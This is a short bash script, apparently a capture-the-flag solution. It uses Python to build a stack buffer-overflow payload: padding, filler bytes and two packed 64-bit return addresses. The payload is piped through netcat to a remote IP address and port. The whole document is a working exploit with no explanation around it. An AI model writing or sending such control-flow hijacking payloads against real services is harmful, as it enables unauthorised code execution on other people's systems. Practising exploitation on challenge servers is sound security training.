#!/bin/bash

(python -c "import struct;out = 'A'*0x10;out += 'bbbbbbbb';out += struct.pack('Q', 0x401132); out += struct.pack('Q', 0x401060); print(out)"; echo) | nc 34.75.105.136 1027
